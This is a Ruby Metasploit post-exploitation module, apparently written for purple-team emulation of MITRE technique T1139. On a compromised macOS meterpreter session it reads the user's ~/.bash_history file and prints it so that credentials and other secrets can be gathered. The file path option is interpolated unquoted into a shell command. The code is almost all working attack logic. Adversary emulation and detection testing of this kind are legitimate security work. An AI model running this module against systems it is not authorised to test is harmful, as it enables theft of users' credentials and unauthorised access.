##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Bash History (T1139) macOS - Purple Team',
      'Description'    => %q{
        Credential Access:
        Bash keeps track of the commands users type on the command-line with the "history" utility. Once a user logs out, the history is flushed to the user's .bash_history file. For each user, this file resides at the same location: ~/.bash_history. Typically, this file keeps track of the user's last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they exit the terminal. Attackers can abuse this by looking through a user's bash_history for credentials or other sensitive information.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Praetorian' ],
      'Platform'       => [ 'osx' ],
      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1139' ] ],
      'SessionTypes'        => [ 'meterpreter' ]
     ))
    register_options(
      [
        OptBool.new("CAT", [false, "If true, this will run `cat ~/.bash_history`. If false, will run `history` instead.", false]),
        OptString.new("HISTFILE", [false, "The path of the history file to be read.", "~/.bash_history"])
      ])
  end

  def run
    return 0 if session.type != "meterpreter"

    print_status("Attempting to view bash history.")

    if datastore['CAT']
      result = cmd_exec("/bin/cat #{datastore['HISTFILE']}")
    else
      result = cmd_exec("HISTFILE=#{datastore['HISTFILE']} && set -o history && history")
    end

    if result.blank?
        print_error("History did not return any commands!")
        return
    else
        print_good result
    end

    print_good("Module finished with success!")
  end
end
